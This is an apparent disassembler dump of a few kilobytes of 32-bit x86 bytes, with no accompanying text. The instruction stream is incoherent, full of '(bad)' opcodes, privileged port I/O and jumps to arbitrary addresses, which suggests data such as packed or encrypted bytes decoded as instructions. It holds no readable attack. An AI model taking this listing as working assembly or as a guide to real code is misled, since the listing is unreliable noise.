  41d02b:	add    DWORD PTR [eax],eax
  41d02d:	add    BYTE PTR [edi+0x1f190203],bh
  41d033:	out    0x36,eax
  41d035:	push   0x47
  41d037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d038:	and    esp,DWORD PTR [edi+0x33]
  41d03b:	pop    ds
  41d03c:	ds pop ecx
  41d03e:	xchg   edi,eax
  41d03f:	cwde   
  41d040:	mov    DWORD PTR [ebp+0x2f],ecx
  41d043:	push   0x445f2b07
  41d048:	popf   
  41d049:	ret    0x627f
  41d04c:	arpl   WORD PTR [edx-0x7f46cb8d],bp
  41d052:	out    0x51,eax
  41d054:	aas    
  41d055:	adc    ah,0xf1
  41d058:	icebp  
  41d059:	rol    DWORD PTR fs:[eax-0x2c990e66],1
  41d060:	aad    0x62
  41d062:	rcl    edx,0xd8
  41d065:	test   eax,0x895e0322
  41d06a:	push   cs
  41d06b:	enter  0xc523,0x3
  41d06f:	jo     0x41d07d
  41d071:	mov    BYTE PTR [ebx+0x77af8a53],al
  41d077:	lahf   
  41d078:	or     bh,0x4f
  41d07b:	adc    edi,esi
  41d07d:	mov    ss,WORD PTR [edi]
  41d07f:	ss es fwait
  41d082:	mov    dh,0xca
  41d084:	adc    edx,ebp
  41d086:	xor    BYTE PTR [esi-0x679d9ebb],0x5b
  41d08d:	imul   ebp,DWORD PTR [eax+edx*4],0x484a15b3
  41d094:	outs   dx,DWORD PTR ds:[esi]
  41d095:	adc    DWORD PTR [edx+0x61a3a156],esp
  41d09b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d09c:	imul   edi,DWORD PTR [ebx-0x24],0xbc2c90f0
  41d0a3:	xchg   ebx,eax
  41d0a4:	test   DWORD PTR [ecx+0x1e08900f],ecx
  41d0aa:	in     al,0x5e
  41d0ac:	das    
  41d0ad:	xor    esi,DWORD PTR [ecx-0x78860b38]
  41d0b3:	sbb    al,dh
  41d0b5:	add    al,0xe7
  41d0b7:	cmp    ax,0x17f8
  41d0bb:	or     DWORD PTR [edx],ebp
  41d0bd:	xchg   ebx,eax
  41d0be:	pop    ss
  41d0bf:	das    
  41d0c0:	sub    BYTE PTR [edx],bh
  41d0c2:	lea    esi,[esi]
  41d0c4:	jecxz  0x41d0cd
  41d0c6:	cmp    ebx,DWORD PTR [ecx+0x68]
  41d0c9:	mov    ebx,0x88ece1b8
  41d0ce:	add    BYTE PTR [edx-0x65],0x36
  41d0d2:	push   0xffffffd3
  41d0d4:	jae    0x41d140
  41d0d6:	fistp  DWORD PTR [edi+0x7621c9e1]
  41d0dc:	push   ebp
  41d0dd:	ss cmp al,0x13
  41d0e0:	fmul   QWORD PTR [ecx]
  41d0e2:	sbb    dh,BYTE PTR [edi+esi*2]
  41d0e5:	mov    bl,BYTE PTR [ebp-0x4f7360b8]
  41d0eb:	std    
  41d0ec:	int3   
  41d0ed:	fnsave [edi]
  41d0ef:	xor    BYTE PTR [esi-0x4a5460b5],0xe4
  41d0f6:	ss (bad) 
  41d0f8:	outs   dx,DWORD PTR ds:[esi]
  41d0f9:	repz mov cl,0x81
  41d0fc:	lahf   
  41d0fd:	jmp    0xd5970a21
  41d102:	loop   0x41d0ef
  41d104:	adc    ecx,DWORD PTR [ebp-0x4c]
  41d107:	mov    esi,0xaf747e4b
  41d10c:	push   ss
  41d10d:	mov    WORD PTR [esi],gs
  41d10f:	mov    DWORD PTR [ebp+0x6d],0x8accf258
  41d116:	mov    al,0x4f
  41d118:	push   eax
  41d119:	cmp    al,BYTE PTR [ebx-0x5]
  41d11c:	popa   
  41d11d:	inc    esp
  41d11e:	add    eax,0xeddcf87d
  41d123:	in     eax,0x31
  41d125:	xchg   esp,edi
  41d127:	imul   ecx,DWORD PTR [ebp+0x28d2bd45],0x7a44e47
  41d131:	mov    ebp,0x98ac29
	...
  41d196:	push   eax
  41d197:	ret    
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d16a
  41d1a3:	test   BYTE PTR [edi+0x1339bf2],ah
  41d1a9:	add    BYTE PTR [edi],al
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [ebx],ch
  41d1af:	jmp    0xc873f2aa
  41d1b4:	mov    esp,0x6c36d2a3
  41d1b9:	and    eax,0xa9bd4066
  41d1be:	packssdw mm0,QWORD PTR [edx]
  41d1c1:	or     dl,al
  41d1c3:	fst    QWORD PTR [ebp-0x11]
  41d1c6:	xor    DWORD PTR es:[edx-0x3a69fc24],eax
  41d1cd:	xchg   ecx,eax
  41d1ce:	cmp    ebx,DWORD PTR [edi+0x700f3dea]
  41d1d4:	xchg   edi,eax
  41d1d5:	and    ah,0x5d
  41d1d8:	sub    esi,DWORD PTR [ecx-0x138abe10]
  41d1de:	(bad)  
  41d1e0:	rol    DWORD PTR [eax+esi*2],cl
  41d1e3:	fst    st(5)
  41d1e5:	inc    eax
  41d1e6:	arpl   WORD PTR [esi],cx
  41d1e8:	popa   
  41d1e9:	pushf  
  41d1ea:	lea    ecx,ds:0x60eea2bd
  41d1f0:	(bad)  
  41d1f1:	les    eax,FWORD PTR [ebx]
  41d1f3:	xor    DWORD PTR [edi+edi*2-0x7c],edx
  41d1f7:	pop    edi
  41d1f8:	dec    ecx
  41d1f9:	mov    cl,BYTE PTR [ebx-0x75]
  41d1fc:	imul   DWORD PTR [ebx+eiz*4+0x7f]
  41d200:	fisttp DWORD PTR [ebp-0x23]
  41d203:	sti    
  41d204:	into   
  41d205:	pop    edi
  41d206:	mov    dl,0x29
  41d208:	popa   
  41d209:	in     eax,0xf0
  41d20b:	fadd   st(0),st
  41d20d:	cmp    bl,BYTE PTR [edx]
  41d20f:	dec    ecx
  41d210:	fisub  WORD PTR [edx-0x13]
  41d213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d214:	jae    0x41d1a0
  41d216:	jmp    0x572e3512
  41d21b:	sbb    ch,0xcc
  41d21e:	test   BYTE PTR [ebp+0x386bdc88],ch
  41d224:	rol    BYTE PTR [esi],0x34
  41d227:	scas   al,BYTE PTR es:[edi]
  41d228:	ins    BYTE PTR es:[edi],dx
  41d229:	fwait
  41d22a:	push   0x7b
  41d22c:	fwait
  41d22d:	test   al,0x9a
  41d22f:	pop    esp
  41d230:	mov    ebp,0x4e82df5e
  41d235:	sub    eax,0xac255dd8
  41d23a:	add    eax,0xc19c769d
  41d23f:	jo     0x41d236
  41d241:	mov    al,ds:0x5348231b
  41d246:	mov    eax,ds:0x98a088d1
  41d24b:	ds dec ebx
  41d24d:	sbb    eax,0x62d05bc4
  41d252:	addr16 jle 0x41d225
  41d255:	idiv   cl
  41d257:	mov    ebp,0x6d05bcbd
  41d25c:	pop    edx
  41d25d:	mov    al,0xb2
  41d25f:	ins    BYTE PTR es:[edi],dx
  41d260:	(bad)  
  41d261:	cmp    DWORD PTR [ebx+eax*4+0x2b],esi
  41d265:	nop
  41d266:	push   ebp
  41d267:	or     BYTE PTR [ebx-0x117c25d8],dh
  41d26d:	rol    DWORD PTR [ebp+0x36dc9aa],1
  41d273:	xchg   BYTE PTR [ecx],dl
  41d275:	dec    eax
  41d276:	test   DWORD PTR ds:0xa51eb96d,edx
  41d27c:	cmp    dl,BYTE PTR [edx+0x2b]
  41d27f:	call   0x8d9880f9
  41d284:	adc    BYTE PTR [esi+eiz*4-0x23],al
  41d288:	xchg   ebp,eax
  41d289:	push   ebp
  41d28a:	jmp    0x8beb:0xf2511322
  41d291:	mov    es,WORD PTR [ebx-0x11]
  41d294:	sbb    BYTE PTR [ebx],0x45
  41d297:	popa   
  41d298:	cmpxchg BYTE PTR [ebx-0x35],dl
  41d29c:	or     eax,0x32f1e15a
  41d2a1:	mov    ch,0xbd
  41d2a3:	and    bh,dh
  41d2a5:	mov    esi,0x2144e60f
  41d2aa:	sub    BYTE PTR [edx+0x443944cc],al
  41d2b0:	or     BYTE PTR [edx+0x3c],al
  41d2b3:	or     ch,ah
	...
  41d315:	add    dh,bh
  41d317:	cmp    cl,0x54
  41d31a:	(bad)  
  41d31b:	jge    0x41d31c
  41d31d:	stos   BYTE PTR es:[edi],al
  41d31e:	sbb    BYTE PTR [ebx-0x13f17a82],ch
  41d324:	out    dx,al
  41d325:	in     al,0xa2
  41d327:	xor    al,0x1
  41d329:	add    BYTE PTR [edi],al
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    BYTE PTR [ebp+0x4b],cl
  41d330:	mov    al,0x84
  41d332:	jp     0x41d2fc
  41d334:	sub    dl,dh
  41d336:	call   0x3261:0x87d86652
  41d33d:	dec    esp
  41d33e:	das    
  41d33f:	pushf  
  41d340:	imul   esi,DWORD PTR [edi],0x1a4710fe
  41d346:	lods   eax,DWORD PTR ds:[esi]
  41d347:	sar    BYTE PTR [edi+esi*2-0x53],cl
  41d34b:	sti    
  41d34c:	jle    0x41d358
  41d34e:	inc    ebp
  41d34f:	mov    bh,0xed
  41d351:	pop    edi
  41d352:	popa   
  41d353:	fisttp QWORD PTR [ecx+0x293e10c0]
  41d359:	aam    0x9a
  41d35b:	sub    edx,DWORD PTR es:[edi+ecx*8-0x61a8c49a]
  41d363:	jg     0x41d347
  41d365:	xchg   DWORD PTR [edx],edi
  41d367:	into   
  41d368:	mov    ecx,DWORD PTR [edx-0x22]
  41d36b:	pushf  
  41d36c:	mov    bl,dl
  41d36e:	mov    dh,0xcf
  41d370:	sbb    eax,0x97afb7f3
  41d375:	loopne 0x41d2f7
  41d377:	jb     0x41d3ec
  41d379:	aam    0xa6
  41d37b:	(bad)  
  41d37c:	jmp    DWORD PTR [ebx+esi*2-0x72]
  41d380:	and    ah,BYTE PTR [eax+ecx*8-0x1d1edabc]
  41d387:	or     al,0xd0
  41d389:	push   ecx
  41d38a:	xchg   BYTE PTR [ecx-0x6],dl
  41d38d:	dec    eax
  41d38e:	push   edi
  41d38f:	adc    ebx,edx
  41d391:	aad    0x1f
  41d393:	sbb    DWORD PTR [ebx+ebx*2+0x1ec57cde],edi
  41d39a:	mul    bl
  41d39c:	pop    eax
  41d39d:	push   edi
  41d39e:	cmp    al,0x61
  41d3a0:	lods   al,BYTE PTR ds:[esi]
  41d3a1:	cli    
  41d3a2:	sub    al,0x65
  41d3a4:	sti    
  41d3a5:	and    edi,ecx
  41d3a7:	mov    dl,0x3a
  41d3a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3aa:	cdq    
  41d3ab:	or     dl,cl
  41d3ad:	packssdw mm2,QWORD PTR [esi]
  41d3b0:	cmp    bh,ch
  41d3b2:	jne    0x41d42a
  41d3b4:	mov    ds:0x491457d0,eax
  41d3b9:	shr    BYTE PTR [eax],0x20
  41d3bc:	mov    esp,0xe30c9dc0
  41d3c1:	lea    edx,[ebx-0x40]
  41d3c4:	push   ds
  41d3c5:	add    DWORD PTR [edi-0x33],esp
  41d3c8:	ror    BYTE PTR [edx+0xb],1
  41d3cb:	or     al,0x34
  41d3cd:	or     eax,0x3a01184e
  41d3d2:	icebp  
  41d3d3:	xchg   ebx,eax
  41d3d4:	or     BYTE PTR [edx+esi*4],dh
  41d3d7:	adc    DWORD PTR [esi-0x4],edx
  41d3da:	std    
  41d3db:	sbb    al,0x70
  41d3dd:	jnp    0x41d434
  41d3df:	es pop eax
  41d3e1:	(bad)  
  41d3e3:	mov    eax,ds:0x1b129e84
  41d3e8:	jo     0x41d396
  41d3ea:	and    al,0xd3
  41d3ec:	stos   DWORD PTR es:[edi],eax
  41d3ed:	pop    edx
  41d3ee:	daa    
  41d3ef:	xlat   BYTE PTR ds:[ebx]
  41d3f0:	rol    DWORD PTR [ebx],0x52
  41d3f3:	das    
  41d3f4:	inc    ebp
  41d3f5:	mov    eax,0x897f2fe1
  41d3fa:	mov    esp,0x883baa1d
  41d3ff:	push   0xffffff8f
  41d401:	lods   eax,DWORD PTR ds:[esi]
  41d402:	(bad)  
  41d403:	repz push ebx
  41d405:	push   edi
  41d406:	lods   eax,DWORD PTR ds:[esi]
  41d407:	mov    dh,0xfa
  41d409:	xor    al,0x3c
  41d40b:	jne    0x41d456
  41d40d:	sub    BYTE PTR [esi+0x4a5f221e],ch
  41d413:	mov    eax,0x3c034e36
  41d418:	les    edx,FWORD PTR [edi+ebp*4-0x4e2df85b]
  41d41f:	jns    0x41d3d4
  41d421:	push   edi
  41d422:	repz or bh,BYTE PTR [edi]
  41d425:	and    dh,BYTE PTR [edx-0x2f9cc0e]
  41d42b:	jp     0x41d43c
  41d42d:	push   ebx
  41d42e:	sub    BYTE PTR [edx],ch
  41d430:	add    DWORD PTR [eax+0xc20f69],0x0
	...
  41d493:	add    BYTE PTR [eax],al
  41d495:	add    dh,dh
  41d497:	rcl    BYTE PTR ss:[edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	(bad)  
  41d4a3:	setbe  cl
  41d4a6:	test   eax,0x7000135
  41d4ab:	add    DWORD PTR [eax],eax
  41d4ad:	add    BYTE PTR [edx+0x7dab0c66],bl
  41d4b3:	in     eax,dx
  41d4b4:	in     eax,dx
  41d4b5:	cmp    al,0x8f
  41d4b7:	cld    
  41d4b8:	shl    esp,cl
  41d4ba:	sub    dh,al
  41d4bc:	fistp  WORD PTR [esi+0x63]
  41d4bf:	pop    ds
  41d4c0:	hlt    
  41d4c1:	sub    ebp,eax
  41d4c3:	mov    dh,0xe4
  41d4c5:	cli    
  41d4c6:	sub    DWORD PTR [ebx-0x37cf7937],ebx
  41d4cc:	popf   
  41d4cd:	mov    edx,ecx
  41d4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4d0:	xchg   esp,eax
  41d4d1:	jl     0x41d51b
  41d4d3:	rol    BYTE PTR [ecx+0x4e],cl
  41d4d6:	xor    eax,0x4fcaabe4
  41d4db:	int3   
  41d4dc:	stos   DWORD PTR es:[edi],eax
  41d4dd:	xlat   BYTE PTR ds:[ebx]
  41d4de:	aaa    
  41d4df:	fdiv   DWORD PTR [edx-0x18]
  41d4e2:	xchg   ecx,eax
  41d4e3:	or     ah,BYTE PTR [esi]
  41d4e5:	push   es
  41d4e6:	mov    eax,0x3455c604
  41d4eb:	xor    BYTE PTR [esi-0x3a],bl
  41d4ee:	xchg   ebx,eax
  41d4ef:	sti    
  41d4f0:	ret    0xd301
  41d4f3:	mov    eax,0x56ef37ae
  41d4f8:	sbb    dh,BYTE PTR [eax-0x5d]
  41d4fb:	loope  0x41d572
  41d4fd:	repz shr BYTE PTR [ebx-0x2],0x76
  41d502:	pusha  
  41d503:	xor    BYTE PTR [esi],0x31
  41d506:	jnp    0x41d4df
  41d508:	into   
  41d509:	xchg   edi,eax
  41d50a:	xchg   esp,eax
  41d50b:	jl     0x41d4cf
  41d50d:	jb     0x41d54d
  41d50f:	ja     0x41d501
  41d511:	pop    ss
  41d512:	pop    esi
  41d513:	and    BYTE PTR [edx],dl
  41d515:	test   DWORD PTR [ebp-0x6f],ebp
  41d518:	push   ebx
  41d519:	xabort 0x14
  41d51c:	lea    esp,[esi-0xc]
  41d51f:	test   BYTE PTR ss:0x6eebddaf,al
  41d526:	xchg   BYTE PTR [eax-0x14e58edf],bh
  41d52c:	pop    ecx
  41d52d:	mov    DWORD PTR ds:0x5b93c7df,edx
  41d533:	arpl   WORD PTR [esi],ax
  41d535:	(bad)  [edx-0x3f]
  41d538:	xchg   ecx,ebp
  41d53a:	loop   0x41d53d
  41d53c:	loopne 0x41d541
  41d53e:	mov    ebx,0x7d5978f6
  41d543:	into   
  41d544:	inc    eax
  41d545:	inc    edi
  41d546:	sti    
  41d547:	retf   0x7b6a
  41d54a:	lock jae 0x41d50d
  41d54d:	adc    dh,ah
  41d54f:	sar    BYTE PTR [ebp+0x2a218b51],1
  41d555:	shr    BYTE PTR [esi-0x78],1
  41d558:	sub    edi,esp
  41d55a:	inc    ebp
  41d55b:	loopne 0x41d5c1
  41d55d:	sbb    al,0x4a
  41d55f:	and    al,0x76
  41d561:	nop
  41d562:	pushf  
  41d563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d564:	popf   
  41d565:	jg     0x41d59c
  41d567:	jbe    0x41d558
  41d569:	clc    
  41d56a:	pushw  ds
  41d56c:	mov    dh,0x72
  41d56e:	shl    DWORD PTR [ecx-0xa],cl
  41d571:	out    dx,al
  41d572:	dec    ebp
  41d573:	mov    es,WORD PTR [eax]
  41d575:	loop   0x41d5f1
  41d577:	sbb    ch,BYTE PTR [ebx]
  41d579:	push   edx
  41d57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d57b:	jge    0x41d52c
  41d57d:	and    eax,0x49be9e03
  41d582:	adc    dl,ch
  41d584:	es in  al,dx
  41d586:	xor    DWORD PTR [ebx+0x11b6530f],esp
  41d58c:	(bad)  
  41d58d:	in     eax,dx
  41d58e:	push   ebx
  41d58f:	xchg   edx,eax
  41d590:	fs cld 
  41d592:	fist   DWORD PTR [ebx]
  41d594:	lds    esi,FWORD PTR [edi+edx*1-0x27d727ae]
  41d59b:	rcr    BYTE PTR [ecx+0x6d531bcf],0x6b
  41d5a2:	dec    ebp
  41d5a3:	jle    0x41d5ff
  41d5a5:	(bad)  
  41d5a6:	mov    bh,0xb
  41d5a8:	std    
  41d5a9:	into   
  41d5aa:	sbb    al,BYTE PTR [edi-0x1d]
  41d5ad:	shl    ch,1
  41d5af:	inc    eax
  41d5b0:	xchg   BYTE PTR [edx+ebx*1],dh
  41d5b3:	sub    bh,cl
	...
  41d615:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi+0x35add221]
  41d624:	mov    cl,0x30
  41d626:	mov    al,0x36
  41d628:	add    DWORD PTR [eax],eax
  41d62a:	pop    es
  41d62b:	add    DWORD PTR [eax],eax
  41d62d:	add    BYTE PTR [esi+0x65],cl
  41d630:	inc    ebp
  41d631:	xlat   BYTE PTR ds:[ebx]
  41d632:	in     eax,dx
  41d633:	lock sub ecx,DWORD PTR [ecx-0x31]
  41d637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d638:	ds push 0x32616e3d
  41d63e:	es pop ss
  41d640:	sbb    DWORD PTR [ebx-0x1061b0f7],ebx
  41d646:	sahf   
  41d647:	idiv   BYTE PTR [eax]
  41d649:	adc    DWORD PTR [esi+0x6de78075],eax
  41d64f:	xchg   ebp,eax
  41d650:	js     0x41d668
  41d652:	leave  
  41d653:	or     DWORD PTR [edx-0x37324a6f],0x59f91948
  41d65d:	push   ebp
  41d65e:	mov    ebp,0x81d0cde5
  41d663:	jmp    0x84462ab
  41d668:	ret    0x8488
  41d66b:	stos   DWORD PTR es:[edi],eax
  41d66c:	(bad)  [esi]
  41d66e:	xor    ebp,0xfffffffc
  41d671:	push   edi
  41d672:	mov    esi,0x7c59747f
  41d677:	push   ebx
  41d678:	in     eax,0x22
  41d67a:	push   0x2a
  41d67c:	mov    ah,0xa7
  41d67e:	jmp    0x41d635
  41d680:	lods   eax,DWORD PTR ds:[esi]
  41d681:	cmp    esi,esi
  41d683:	xor    al,0x83
  41d685:	je     0x41d6a8
  41d687:	test   BYTE PTR [eax+0x8f23940],dh
  41d68d:	enter  0x4479,0xc8
  41d691:	out    dx,eax
  41d692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d693:	lock inc edi
  41d695:	jg     0x41d6db
  41d697:	mov    ebp,0xeab33a1f
  41d69c:	fadd   DWORD PTR [ebp+edx*4-0x596f452c]
  41d6a3:	lods   al,BYTE PTR ds:[esi]
  41d6a4:	push   ds
  41d6a5:	outs   dx,BYTE PTR ds:[esi]
  41d6a6:	out    0xe,al
  41d6a8:	les    ecx,FWORD PTR [ecx+0x37]
  41d6ab:	adc    al,0x1e
  41d6ad:	jecxz  0x41d713
  41d6af:	aad    0xde
  41d6b1:	int    0xc5
  41d6b3:	and    ch,BYTE PTR [edx+0x76ce9cbc]
  41d6b9:	jne    0x41d6cc
  41d6bb:	out    0xa5,eax
  41d6bd:	push   0x70a6b8b3
  41d6c2:	popf   
  41d6c3:	iret   
  41d6c4:	xchg   ebx,eax
  41d6c5:	sbb    al,0xdd
  41d6c7:	inc    ecx
  41d6c8:	push   0xd2681a91
  41d6cd:	add    al,0x5a
  41d6cf:	std    
  41d6d0:	fcomp  QWORD PTR [ebx]
  41d6d2:	dec    ebx
  41d6d3:	out    dx,al
  41d6d4:	call   0xc08c:0x9a602d1b
  41d6db:	xchg   edx,eax
  41d6dc:	addr16 aad 0x2f
  41d6df:	pop    esp
  41d6e0:	xor    BYTE PTR ds:0x76e6295e,0x4f
  41d6e7:	lods   al,BYTE PTR ds:[esi]
  41d6e8:	sub    BYTE PTR [ecx],ah
  41d6ea:	mov    ebx,0xb4d1979a
  41d6ef:	repz jne 0x41d70c
  41d6f2:	pop    edx
  41d6f3:	lods   eax,DWORD PTR ds:[esi]
  41d6f4:	gs fwait
  41d6f6:	outs   dx,DWORD PTR ds:[esi]
  41d6f7:	add    ecx,esi
  41d6f9:	imul   DWORD PTR [edi-0x5d7f9f78]
  41d6ff:	out    0x4a,al
  41d701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d702:	jmp    0x41d77c
  41d704:	fdivrp st(2),st
  41d706:	jae    0x41d69d
  41d708:	cdq    
  41d709:	jo     0x41d73f
  41d70b:	je     0x41d6ad
  41d70d:	and    DWORD PTR [ebx-0x18],esp
  41d710:	sbb    DWORD PTR [edi+0x97329b8],0x92468f20
  41d71a:	fnstenv ds:0xf08a38a4
  41d720:	stc    
  41d721:	adc    ecx,ebp
  41d723:	out    0xaa,al
  41d725:	mov    al,0xb6
  41d727:	je     0x41d761
  41d729:	rcl    DWORD PTR [ecx],cl
  41d72b:	jne    0x41d79e
  41d72d:	out    dx,al
  41d72e:	adc    eax,DWORD PTR [edx-0x66]
  41d731:	(bad)  
  41d732:	call   0x42cc16
	...
  41d793:	add    BYTE PTR [eax],al
  41d795:	add    BYTE PTR [esi+ecx*8],ah
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	rep lods eax,DWORD PTR ds:[esi]
  41d7a4:	jnp    0x41d7d1
  41d7a6:	mov    bh,0x37
  41d7a8:	add    DWORD PTR [eax],eax
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    ah,ah
  41d7af:	retf   
  41d7b0:	cmp    DWORD PTR [edi-0x4fd98b6],ebx
  41d7b6:	jnp    0x41d76e
  41d7b8:	icebp  
  41d7b9:	pop    esi
  41d7ba:	fcmovne st,st(7)
  41d7bc:	(bad)  
  41d7be:	nop
  41d7bf:	sbb    al,0x80
  41d7c1:	daa    
  41d7c2:	lock xor dl,bl
  41d7c5:	or     ebp,DWORD PTR [esp+edx*8]
  41d7c8:	addr16 or cl,ch
  41d7cb:	scas   eax,DWORD PTR es:[edi]
  41d7cc:	add    eax,0x4fd46a39
  41d7d1:	loope  0x41d823
  41d7d3:	or     BYTE PTR [edi+0x4b476e30],dl
  41d7d9:	pop    edi
  41d7da:	cmp    eax,0xb347ab12
  41d7df:	in     eax,0x79
  41d7e1:	dec    ecx
  41d7e2:	sbb    al,0xed
  41d7e4:	jg     0x41d77e
  41d7e6:	push   es
  41d7e7:	test   DWORD PTR [esi-0x5f],edx
  41d7ea:	aaa    
  41d7eb:	aad    0x43
  41d7ed:	sbb    ebp,DWORD PTR [edi+edi*1-0x3e]
  41d7f1:	mov    DWORD PTR [esi-0x5],0x3e83a3fe
  41d7f8:	popf   
  41d7f9:	jecxz  0x41d811
  41d7fb:	data16 jns 0x41d7e7
  41d7fe:	repnz cmp BYTE PTR [ebp-0xc],ah
  41d802:	adc    al,0x92
  41d804:	js     0x41d86f
  41d806:	and    eax,0x6e467425
  41d80b:	repnz nop
  41d80d:	(bad)  
  41d80f:	imul   ebp,DWORD PTR [ecx+0x70],0x608694cf
  41d816:	sub    bh,BYTE PTR [ebp+0x42]
  41d819:	or     esp,DWORD PTR [ebp+0x32594615]
  41d81f:	scas   eax,DWORD PTR es:[edi]
  41d820:	call   0x46d8b76f
  41d825:	or     bh,dh
  41d827:	ret    0x8ae8
  41d82a:	call   0x6c1b183e
  41d82f:	lods   eax,DWORD PTR ds:[esi]
  41d830:	push   ss
  41d831:	je     0x41d83a
  41d833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d834:	icebp  
  41d835:	pop    esp
  41d836:	cmp    ah,BYTE PTR [ebx+esi*4+0x3737297d]
  41d83d:	ror    DWORD PTR [esi+ebx*4],0xaa
  41d841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d842:	pop    esi
  41d843:	rcr    BYTE PTR [eax],cl
  41d845:	imul   edi,esi,0x76
  41d848:	retf   
  41d849:	pusha  
  41d84a:	loopne 0x41d883
  41d84c:	mov    al,ds:0xf551f3d3
  41d851:	cld    
  41d852:	dec    ebx
  41d853:	mov    esp,0xd4fb7975
  41d858:	add    ebx,DWORD PTR [ecx]
  41d85a:	xchg   ecx,ebx
  41d85c:	fsub   QWORD PTR [esi]
  41d85e:	pop    eax
  41d85f:	lahf   
  41d860:	fstp   DWORD PTR [eax-0x61176ecd]
  41d866:	stos   DWORD PTR es:[edi],eax
  41d867:	call   0x970b143
  41d86c:	pop    edi
  41d86d:	out    0x99,al
  41d86f:	ret    0x6c41
  41d872:	add    eax,0xbf295364
  41d877:	xlat   BYTE PTR ds:[ebx]
  41d878:	adc    eax,0x4ef286fd
  41d87d:	clc    
  41d87e:	add    BYTE PTR [ebx-0x3368a3db],ch
  41d884:	mov    al,0xfa
  41d886:	inc    edi
  41d887:	repz xchg esp,eax
  41d889:	push   esi
  41d88a:	jmp    0x95c4afe
  41d88f:	jecxz  0x41d81d
  41d891:	hlt    
  41d892:	pop    ds
  41d893:	enter  0xad06,0x57
  41d897:	push   ebx
  41d898:	pusha  
  41d899:	hlt    
  41d89a:	retf   0x6b72
  41d89d:	mov    esp,0x4ebad637
  41d8a2:	mov    ds:0x2ed0ab9d,eax
  41d8a7:	test   ebx,esp
  41d8a9:	push   edi
  41d8aa:	xlat   BYTE PTR ds:[ebx]
  41d8ab:	sbb    DWORD PTR [edi],esp
  41d8ad:	les    edi,FWORD PTR [edx-0x2fbfe1a4]
  41d8b3:	out    dx,al
  41d8b4:	add    DWORD PTR [eax],eax
	...
  41d916:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0x1b1b7403
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    BYTE PTR [ecx+0x1b46b61a],cl
  41d933:	adc    eax,0x805f1a06
  41d938:	loopne 0x41d8d4
  41d93a:	loope  0x41d8da
  41d93c:	mov    cl,0xc
  41d93e:	(bad)  
  41d93f:	mov    ds:0x359e79e0,al
  41d944:	pop    ebx
  41d945:	stos   DWORD PTR es:[edi],eax
  41d946:	dec    ebx
  41d947:	test   BYTE PTR [esi-0x37],dh
  41d94a:	cmp    BYTE PTR [ecx],ah
  41d94c:	xchg   esi,eax
  41d94d:	push   eax
  41d94e:	ret    0x3ee3
  41d951:	aaa    
  41d952:	jne    0x41d933
  41d954:	cmp    DWORD PTR ds:0x827651b1,esp
  41d95a:	mov    eax,ds:0x3ce7b12b
  41d95f:	fldenv [eax]
  41d961:	inc    ecx
  41d962:	or     ecx,DWORD PTR [ebx+0x4670adb0]
  41d968:	and    DWORD PTR [edx],edi
  41d96a:	js     0x41d924
  41d96c:	shr    BYTE PTR ds:0x8f879b95,0x23
  41d973:	mov    es,eax
  41d975:	jp     0x41d9e3
  41d977:	(bad)  
  41d978:	sub    DWORD PTR [ebp+esi*2+0x2f],edx
  41d97c:	push   edi
  41d97d:	shl    BYTE PTR [ebp-0x5034b655],1
  41d983:	aas    
  41d984:	push   cs
  41d985:	add    BYTE PTR [ebx+0x1b],0xee
  41d989:	cli    
  41d98a:	dec    ebx
  41d98b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d98c:	or     eax,0xce29708e
  41d991:	ficomp DWORD PTR [ebp+0x34]
  41d994:	push   ss
  41d995:	mul    BYTE PTR [esi-0x2e9eb278]
  41d99b:	leave  
  41d99c:	in     al,0xbf
  41d99e:	test   eax,0x485fea90
  41d9a3:	test   al,0x21
  41d9a5:	je     0x41d9ef
  41d9a7:	or     BYTE PTR [edx],al
  41d9a9:	push   esi
  41d9aa:	retf   0x5ae1
  41d9ad:	rcr    BYTE PTR [di-0x6678],cl
  41d9b2:	ins    DWORD PTR es:[edi],dx
  41d9b3:	xchg   edi,eax
  41d9b4:	sbb    esp,DWORD PTR [ebx]
  41d9b6:	sar    bh,cl
  41d9b8:	cwde   
  41d9b9:	xor    al,0x2
  41d9bb:	xchg   ebx,eax
  41d9bc:	fnstsw WORD PTR [ecx-0x2b4858bf]
  41d9c2:	ror    DWORD PTR [eax+0x3f],1
  41d9c5:	dec    BYTE PTR [edi]
  41d9c7:	adc    cl,BYTE PTR [ebx-0x33]
  41d9ca:	int    0xbb
  41d9cc:	push   edi
  41d9cd:	jne    0x41d9e2
  41d9cf:	mov    cl,0xf9
  41d9d1:	inc    ebp
